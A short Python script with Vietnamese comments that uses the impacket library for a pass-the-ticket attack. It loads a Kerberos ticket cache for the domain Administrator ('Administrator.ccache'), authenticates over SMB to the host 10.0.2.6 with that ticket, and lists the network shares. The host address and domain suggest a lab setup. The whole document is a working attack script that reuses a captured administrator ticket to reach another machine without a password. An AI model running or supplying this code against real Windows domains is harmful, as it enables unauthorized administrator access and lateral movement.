from impacket.smbconnection import SMBConnection
from impacket.krb5.kerberosv5 import KerberosError
import os

# Đường dẫn file ccache chứa vé Kerberos
ccache_file = "Administrator.ccache"

# Nạp vé Kerberos vào môi trường
if os.path.exists(ccache_file):
    os.environ["KRB5CCNAME"] = ccache_file
    print(f"Loaded Kerberos ccache from {ccache_file}")
else:
    print("ccache file not found.")
    exit(1)

# Thông tin mục tiêu
target_ip = "10.0.2.6"
target_user = "duongquanghao110.it\\Administrator"

try:
    # Kết nối SMB với sử dụng vé Kerberos
    smb_connection = SMBConnection(target_ip, target_ip)
    smb_connection.kerberosLogin(target_user, "", "", "", "", useCache=True)
    print("Kerberos authentication successful!")
    
    # Liệt kê thư mục chia sẻ trên mục tiêu
    shares = smb_connection.listShares()
    for share in shares:
        print(f"Share: {share['shi1_netname']}")

    smb_connection.logoff()
except KerberosError as e:
    print(f"Kerberos Error: {e}")
except Exception as ex:
    print(f"Error: {ex}")
